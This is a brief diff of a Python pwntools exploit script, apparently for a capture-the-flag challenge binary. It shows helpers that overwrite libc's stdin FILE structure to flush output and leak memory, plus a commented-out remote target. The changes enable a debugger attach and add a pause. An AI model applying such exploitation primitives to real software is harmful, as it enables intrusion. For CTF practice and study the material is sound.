@@ -7,7 +7,7 @@ env = {"LD_PRELOAD":os.path.join(os.getcwd(), "./libc")}
 p = process("./binary" , env=env)
 #p = remote("124.16.75.162",40003)
 libc = ELF("./libc")
-#gdb.attach(p)
+gdb.attach(p)
 mmap_size = 4194304 #0x400000
 init_offset = 0x401000 - 0x10
 
@@ -24,6 +24,7 @@ def fflushout():
     writelibc(libc.symbols._IO_2_1_stdin_, p8(0x88 | 0x2))
     data = p.clean(timeout=2)
     writelibc(libc.symbols._IO_2_1_stdin_, p8(0x88))
+    raw_input("flush first.")
     return data
 
 def leak(addr):
